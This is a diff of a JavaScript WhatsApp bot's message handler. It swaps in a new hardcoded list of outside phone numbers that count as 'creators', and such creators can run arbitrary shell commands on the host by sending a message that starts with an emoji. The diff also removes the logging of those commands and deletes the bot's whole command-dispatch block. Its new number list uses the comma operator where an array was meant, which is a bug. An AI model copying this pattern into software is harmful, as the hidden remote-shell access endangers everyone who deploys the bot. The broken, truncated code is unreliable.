@@ -509,190 +509,51 @@ registerAntiNewsletter(conn);
  }
   
   
-          
-        const udp = botNumber.split('@')[0];
-        const dyby = ['50948702213', '50934960331', '50938598801'];
-        
-        if (isGroup) {
+          const udp = botNumber.split('@')[0];
+    const davex = ('50948336180', '50934960331', '923192173398', '237682803592');
+    
+    if (isGroup) {
                 updateActivity(from, sender);
 	  }
+	  // اینجا یک آرایه قرار می‌دهیم
+  const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
+  let isCreator = [udp, ...davex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
+    .includes(mek.sender);
 	  
-        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
-        let isCreator = [udp, ...dyby, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
-            .includes(sender);
 
-        if (isCreator && mek.text.startsWith("🧑‍🧒‍🧒")) {
+	  if (isCreator && mek.text.startsWith("🧑‍🧒‍🧒")) {
             let code = budy.slice(2);
             if (!code) {
                 reply(`Provide me with a query to run Master!`);
-                console.log(chalk.red(`[ ❌ ] No code provided for & command by ${sender}`));
                 return;
             }
             const { spawn } = require("child_process");
             try {
-                console.log(chalk.cyan(`[ 📡 ] Executing shell command: ${code} by ${sender}`));
                 let resultTest = spawn(code, { shell: true });
                 resultTest.stdout.on("data", data => {
                     reply(data.toString());
-                    console.log(chalk.green(`[ ✅ ] Command output: ${data.toString()}`));
                 });
                 resultTest.stderr.on("data", data => {
                     reply(data.toString());
-                    console.log(chalk.red(`[ ❌ ] Command error: ${data.toString()}`));
                 });
                 resultTest.on("error", data => {
                     reply(data.toString());
-                    console.log(chalk.red(`[ ❌ ] Command execution failed: ${data.toString()}`));
                 });
                 resultTest.on("close", code => {
                     if (code !== 0) {
                         reply(`command exited with code ${code}`);
-                        console.log(chalk.red(`[ ❌ ] Command exited with code ${code}`));
                     }
                 });
             } catch (err) {
                 reply(util.format(err));
-                console.log(chalk.red(`[ ❌ ] Error executing & command: ${err.message}`));
             }
             return;
         }
 
         // Command execution with logging
-        const events = require('./command');
-        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
-        if (isCmd) {
-            const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || 
-                       events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
-            if (cmd) {
-                // Log command detection
-                console.log(chalk.cyan(
-                    `[ 📡 ] Command Detected: ${prefix}${cmdName}\n` +
-                    `├── Sender: ${pushname} (${sender})\n` +
-                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                    `├── Args: ${args.join(' ') || 'None'}\n` +
-                    `├── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}\n` +
-                    `└── Status: Processing`
-                ));
-
-                // Apply command reaction if specified
-                if (cmd.react) {
-                    await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
-                    console.log(chalk.cyan(`[ 😺 ] Applied command reaction: ${cmd.react} for ${prefix}${cmdName}`));
-                }
-
-                try {
-                    // Execute command
-                    await cmd.function(conn, mek, m, {
-                        from, quoted, body, isCmd, command, args, q, text, 
-                        isGroup, sender, senderNumber, botNumber2, botNumber, 
-                        pushname, isMe, isOwner, isCreator, groupMetadata, 
-                        groupName, participants, groupAdmins, isBotAdmins, 
-                        isAdmins, reply
-                    });
-                    // Log successful execution
-                    console.log(chalk.green(
-                        `[ ✅ ] Command Executed: ${prefix}${cmdName}\n` +
-                        `├── Sender: ${pushname} (${sender})\n` +
-                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                    ));
-                } catch (e) {
-                    // Log error
-                    console.error(chalk.red(
-                        `[ ❌ ] Command Error: ${prefix}${cmdName}\n` +
-                        `├── Sender: ${pushname} (${sender})\n` +
-                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                        `├── Error: ${e.message}\n` +
-                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                    ));
-                    reply(`Error executing command: ${e.message}`);
-                }
-            } else {
-                // Log unknown command
-                console.log(chalk.yellow(
-                    `[ ⚠️ ] Unknown Command: ${prefix}${cmdName}\n` +
-                    `├── Sender: ${pushname} (${sender})\n` +
-                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                    `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                ));
-            }
-        }
-
-        // Handle non-command events
-        events.commands.forEach(async (command) => {
-            try {
-                if (body && command.on === "body") {
-                    console.log(chalk.cyan(
-                        `[ 📡 ] Body Event Triggered: ${command.pattern || command.on}\n` +
-                        `├── Sender: ${pushname} (${sender})\n` +
-                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                    ));
-                    await command.function(conn, mek, m, {
-                        from, l, quoted, body, isCmd, command, args, q, text, 
-                        isGroup, sender, senderNumber, botNumber2, botNumber, 
-                        pushname, isMe, isOwner, isCreator, groupMetadata, 
-                        groupName, participants, groupAdmins, isBotAdmins, 
-                        isAdmins, reply
-                    });
-                } else if (mek.q && command.on === "text") {
-                    console.log(chalk.cyan(
-                        `[ 📡 ] Text Event Triggered: ${command.pattern || command.on}\n` +
-                        `├── Sender: ${pushname} (${sender})\n` +
-                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                    ));
-                    await command.function(conn, mek, m, {
-                        from, l, quoted, body, isCmd, command, args, q, text, 
-                        isGroup, sender, senderNumber, botNumber2, botNumber, 
-                        pushname, isMe, isOwner, isCreator, groupMetadata, 
-                        groupName, participants, groupAdmins, isBotAdmins, 
-                        isAdmins, reply
-                    });
-                } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
-                    console.log(chalk.cyan(
-                        `[ 📡 ] Image Event Triggered: ${command.pattern || command.on}\n` +
-                        `├── Sender: ${pushname} (${sender})\n` +
-                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                    ));
-                    await command.function(conn, mek, m, {
-                        from, l, quoted, body, isCmd, command, args, q, text, 
-                        isGroup, sender, senderNumber, botNumber2, botNumber, 
-                        pushname, isMe, isOwner, isCreator, groupMetadata, 
-                        groupName, participants, groupAdmins, isBotAdmins, 
-                        isAdmins, reply
-                    });
-                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
-                    console.log(chalk.cyan(
-                        `[ 📡 ] Sticker Event Triggered: ${command.pattern || command.on}\n` +
-                        `├── Sender: ${pushname} (${sender})\n` +
-                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                    ));
-                    await command.function(conn, mek, m, {
-                        from, l, quoted, body, isCmd, command, args, q, text, 
-                        isGroup, sender, senderNumber, botNumber2, botNumber, 
-                        pushname, isMe, isOwner, isCreator, groupMetadata, 
-                        groupName, participants, groupAdmins, isBotAdmins, 
-                        isAdmins, reply
-                    });
-                }
-            } catch (e) {
-                console.error(chalk.red(
-                    `[ ❌ ] Error in Event Handler: ${command.pattern || command.on}\n` +
-                    `├── Sender: ${pushname} (${sender})\n` +
-                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
-                    `├── Error: ${e.message}\n` +
-                    `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
-                ));
-            }
-        });
-    } catch (e) {
-        console.error(chalk.red(`[ ❌ ] Error in messages.upsert: ${e.message}`));
-    }
-});
+        
+   
     //===================================================   
 
    //=========BAN SUDO=============
